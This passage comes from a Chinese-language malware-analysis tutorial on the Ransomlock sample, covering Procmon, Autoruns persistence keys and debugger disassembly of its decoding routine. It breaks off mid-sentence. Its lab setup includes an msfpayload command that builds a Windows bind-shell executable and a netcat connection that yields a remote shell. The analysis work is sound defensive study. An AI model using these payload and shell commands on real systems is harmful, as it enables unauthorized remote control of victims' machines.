

msfpayload windows/shell_bind_tcp RHOST=192.168.184.134 X > malo.exe
cp malo.exe /var/www/GH5/
现在，通过浏览 http://<kali-IP>/GH5/malo.exe 将 malo.exe 下载到受害机器上。

- 2. 在 Kali 上运行 netcat 以等待远程 shell，然后在受害机器上运行 malo.exe。在这里，你可以看到已接收到 Windows shell：
- root@kali:/var/www/GH5# nc 192.168.184.134 4444
- Microsoft Windows [Version 6.1.7601]
- Copyright (c) 2009 Microsoft Corporation. All rights reserved.
- C:\Users\Public\Downloads>

- 3. 启动 Procmon 并设置过滤器以仅监控 locker.exe。选择 Filter | Filter...
- 然后创建条件“进程名称为 locker.exe”，如下所示。单击 Add
- 然后单击 Apply。

![](img/5f597c6a70133069118d9e804ace3775_526_0.png)

- 4. 运行恶意软件。几秒钟后，屏幕将被一种类似俄语的语言的消息锁定，如下所示。由于未安装语言包，你会看到许多奇怪的字符。但是，消息的内容与此练习无关。

![](img/5f597c6a70133069118d9e804ace3775_527_0.png)

- 5. 要通过终止恶意进程来解锁屏幕，请转到步骤 2 中获得的 shell，运行 tasklist /v | find locker.exe，然后终止它（假设 locker.exe 的 PID 为 1508）：

```
C:\Users\Public\Downloads\Tools>pskill 1508
pskill 1508
```

PsKill v1.15 - Terminates processes on local or remote systems
Copyright (C) 1999-2012 Mark Russinovich
Sysinternals - www.sysinternals.com

Process 1508 killed.

- 6. 杀死所有恶意进程后，桌面应该会被解锁，你可以查看 Procmon 或任何其他动态分析工具的结果。
- 将桌面返还给受害者的另一种方法是从远程 shell 启动 explorer.exe（该进程在恶意软件控制机器之前已被杀死）。

![](img/5f597c6a70133069118d9e804ace3775_527_1.png)

CAUTION 杀死 locker.exe 并不意味着系统已被清理。
此步骤的目的仅是为了在感染后解锁屏幕以分析恶意软件。

我们已完成对远程 shell 的使用，现在返回 VM 中的 Windows，此时它应该已经被解锁：

- 1. 详细查看 Procmon 结果。你可以看到恶意软件正在搜索 taskkill.exe（它可能被用来杀死 explorer.exe）。它还似乎试图查找自定义 DLL，例如 NATIONA_PARK23423.DLL 和 HERBAL_SCIENCE2340.DLL，但无法从此工具中找到太多细节。

- 2. 运行 Sysinternals 的 Autoruns 工具并转到 Logon 选项卡，如下所示。在这里，你可以看到恶意软件将在每次重新启动时执行，因为 explorer 值已添加到 Run 键下，并且通过更改 Winlogon\\Shell 键将默认 shell 设置为 locker.exe（通常，explorer.exe 是预期值）。这样一来，Ransomlock 会在最终用户登录后立即接管。

| 全部 | 登录 | Explorer | Internet Explorer | 计划任务 | 服务 | 驱动程序 |
|---|---|---|---|---|---|---|
| 自动运行项 | 描述 | 映像路径 | | | | |
| HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell | | | | | | |
| [x] C:\\Users\\...\\Downloads\\locker.exe | | c:\\Users\\...\\downloads\\locker.exe | | | | |
| HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run | | | | | | |
| [x] explorer | | c:\\Users\\...\\downloads\\locker.exe | | | | |

因此，我们现在对恶意软件的行为有了更好的了解。然而，我们还远未理解其内部运作机制。动态分析适合快速浏览，因为有时它会提供足够的信息来理解关键点。
然而，我们仍然不知道屏幕是如何被锁定的，恶意软件是否会尝试连接到命令和控制（C2）服务器，或者是否对受感染机器造成了其他损害。通过调试恶意程序并使用 IDA 进行静态分析，可以更好地理解这些不同的问题——在进行深度恶意软件分析时，这是一种完美的组合。

## Example 19-2: 静态分析

![](img/5f597c6a70133069118d9e804ace3775_528_0.png)

NOTE 本节将分析的 Ransomlock 样本的 MD5 哈希值为 ED3AEF329EBF4F6B11E1C7BABD9859E3。

通常，勒索软件以使用复杂的混淆、反调试、反反汇编和反虚拟机技术而闻名，旨在使恶意软件的内部运作机制非常难以理解。

![](img/5f597c6a70133069118d9e804ace3775_529_0.png)

NOTE 在本章中，术语 *解码* 将用作去混淆、解包或解密的同义词。

因此，我们有两个目标：

- • 了解用于避免检测、调试和虚拟化的“反”技术（如果有的话）。

- • 了解用于接管我们桌面的技术。完成此示例后，我们应该能够回答诸如以下问题：为什么我的鼠标和键盘停止工作了？为什么所有窗口都消失了？为什么通过调试器运行恶意软件无效？

## 内存中的解码

我们将再次使用之前练习中使用的 locker.exe 二进制文件，因此请在 VM 中的 Immunity Debugger 中打开它。如果你直接按 F9 运行，出于某种原因桌面不会被锁定，可能是由于一些反调试检查。让我们找出原因。当我们使用调试器重新打开它时，我们会停在以下入口点：

```
004042C2 PUSH EBP
004042C3 MOV EBP,ESP
004042C5 AND ESP,FFFFFFFF
004042C8 SUB ESP,34
004042CB PUSH EBX
004042CC PUSH ESI
004042CD PUSH EDI
004042CE PUSH locker.004203F8
004042D3 PUSH 64
004042D5 PUSH locker.00420558
004042DA PUSH locker.00420404
004042DF PUSH locker.00420418
004042E4 PUSH locker.0042042C
004042E9 CALL DWORD PTR DS : [<&KERNEL32.GetPrivateProfileStringA>]
```

这些指令只是伪装成正常操作的无意义代码。如果我们继续单步进入代码（使用 F7），最终会发现有几十行重复的代码在解码新的指令集。下面是一个很好的示例：

```
004044A4    MOV EDX,DWORD PTR DS:[420240]
004044AA    MOV ESI,DWORD PTR DS:[420248]
004044B0    XOR EDX,ESI
004044B2    MOV DWORD PTR DS:[420240],EDX
004044B8    MOV EDX,DWORD PTR DS:[4203F4]
004044BE    MOV ESI,DWORD PTR DS:[420240]
004044C4    ADD DWORD PTR DS:[EDX],ESI
004044C6    MOV EDX,DWORD PTR SS:[ESP+30]
004044CA    MOV ESI,DWORD PTR SS:[ESP+34]
004044CE    XOR EDX,ECX
004044D0    ADD EDX,EAX
004044D2    MOV DWORD PTR DS:[420248],EDX
```

我们可以看到，数据段中偏移量 0x420240 和 0x420248 的双字在某些计算后正在被修改。整个二进制文件中会多次找到这种解码指令，单步进入每条指令会非常乏味且耗时。因此，我们需要找到一种方法跳过这些指令，直接到达有助于我们理解恶意软件行为的有趣代码。

加快分析速度的一个好策略是查找对运行时生成地址的调用。通常，在解码步骤完成后才能找到这些地址；这样的指令位于地址 0x00401885：

```
00401885 FF D0 [1] CALL EAX;
```

![](img/5f597c6a70133069118d9e804ace3775_530_0.png)

NOTE 在分析过程中值得牢记的一件事是，前一条指令位于基地址 0x00400000 的相对地址 0x1885 处。

让我们单步进入这条指令以查看 EAX 的值。我们可以在 0x00401885 处设置断点，一旦执行到该指令，我们会发现 EAX 的值等于 0x0041FD12，它位于资源（.rsrc）部分。

在按 F7 单步进入调用之前，请务必删除任何断点（通过按 ALT-B 获取断点列表并使用 DELETE 按钮），因为调试器在内部将命令的第一个字节更改为 0xCC（这告诉调试器在该指令处停止）。因此，而不是原始 opcode 为 FF D0 [1]，内存中的值已更改为 CC D0。稍后，恶意软件会将这些指令复制到新位置，从而破坏下一条要执行的指令。当我们删除断点时，被调试器更改的字节会恢复到其原始值。这就是恶意软件将自身复制到其他内存位置的原因之一——为了携带断点，这些断点会破坏下一次执行命令中的

